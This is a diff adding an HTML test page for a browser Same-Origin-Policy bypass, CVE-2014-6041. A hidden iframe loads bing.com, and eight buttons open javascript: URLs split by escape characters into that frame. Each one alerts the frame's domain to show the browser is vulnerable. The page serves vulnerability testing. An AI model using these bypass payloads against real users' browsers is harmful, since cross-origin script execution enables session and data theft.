@@ -1,0 +1,77 @@
+<html>
+	<head>
+		<title>Universal XSS (UXSS) SOP Bypass Vulnerability test</title>
+		<style type="text/css">
+			*{margin:0;padding:0;}
+			.wrapper {
+				width: 95%;
+				background-color: #16a085;
+				margin: 0 auto;
+				font-family: times new roman;
+				height: 120%;
+			}
+			.line {
+				background-color: #ecf0f1;
+				text-align: center;
+				padding: 10px;
+				color: #16a085;;
+			}
+			.main {
+				color: #fff;
+				padding: 10px;
+			}
+			.test {
+				width: 200px;
+				height: 40px;
+				background-color: #fff;
+				border: none;
+				border-radius: 100px;	
+				color: #16a085;
+				font-size: 1.6em;
+				margin: 0 auto;
+			}
+			.note {
+				background: #1abc9c;
+				color: #fff;
+				padding: 10px;
+				width: 95%;
+				margin: 0 auto;
+				margin-top: 40px;
+			}
+		</style>
+	</head>
+<body>
+
+<iframe height="0" width="0" name="CVE-2014-6041" src="http://www.bing.com" style="display:none;"></iframe>
+
+	<div class="wrapper">
+			<img src="and.png">
+	
+			<h3 class="line">SOP Bypass - Testcase 9</h3>	
+
+		<div class="main">
+				<p>Testing for SOP bypass using escape characters <p>
+		</div>
+		
+		<center>	<input type="button" id="btn_test" class="test" value="Run Test Case 1" onclick="window.open('\u0000javascript:test=\'Accessed property of \'+document.domain+\'. Your browser is vulnerable to UXSS\'; alert(test);','CVE-2014-6041');" /></center>
+
+			</br>	<center>	<input type="button" id="btn_test" class="test" value="Run Test Case 2" onclick="window.open('jav\nascript:test=\'Accessed property of \'+document.domain+\'. Your browser is vulnerable to UXSS\'; alert(test);','CVE-2014-6041');" /></center>
+				</br><center>	<input type="button" id="btn_test" class="test" value="Run Test Case 3" onclick="window.open('jav\rascript:test=\'Accessed property of \'+document.domain+\'. Your browser is vulnerable to UXSS\'; alert(test);','CVE-2014-6041');" /></center>
+				</br><center>	<input type="button" id="btn_test" class="test" value="Run Test Case 4" onclick="window.open('javas\tcript:test=\'Accessed property of \'+document.domain+\'. Your browser is vulnerable to UXSS\'; alert(test);','CVE-2014-6041');" /></center>
+				</br><center>	<input type="button" id="btn_test" class="test" value="Run Test Case 5" onclick="window.open('javas\fcript:test=\'Accessed property of \'+document.domain+\'. Your browser is vulnerable to UXSS\'; alert(test);','CVE-2014-6041');" /></center>
+				</br><center>	<input type="button" id="btn_test" class="test" value="Run Test Case 6" onclick="window.open('javasc\bript:test=\'Accessed property of \'+document.domain+\'. Your browser is vulnerable to UXSS\'; alert(test);','CVE-2014-6041');" /></center>
+				</br><center>	<input type="button" id="btn_test" class="test" value="Run Test Case 7" onclick="window.open('java\vscript:test=\'Accessed property of \'+document.domain+\'. Your browser is vulnerable to UXSS\'; alert(test);','CVE-2014-6041');" /></center>
+				</br><center>	<input type="button" id="btn_test" class="test" value="Run Test Case 8" onclick="window.open('java\0script:test=\'Accessed property of \'+document.domain+\'. Your browser is vulnerable to UXSS\'; alert(test);','CVE-2014-6041');" /></center>
+
+		</br></br>
+			<div class="note">
+			
+				<p><strong>Note:</strong> <br />
+					If page loads popup and displays a alert box "Accessed Property of bing.com, your browser is vulnerable to SOP bypass "
+				</p>
+			</div>
+	</div>
+
+
+</body>
+</html>
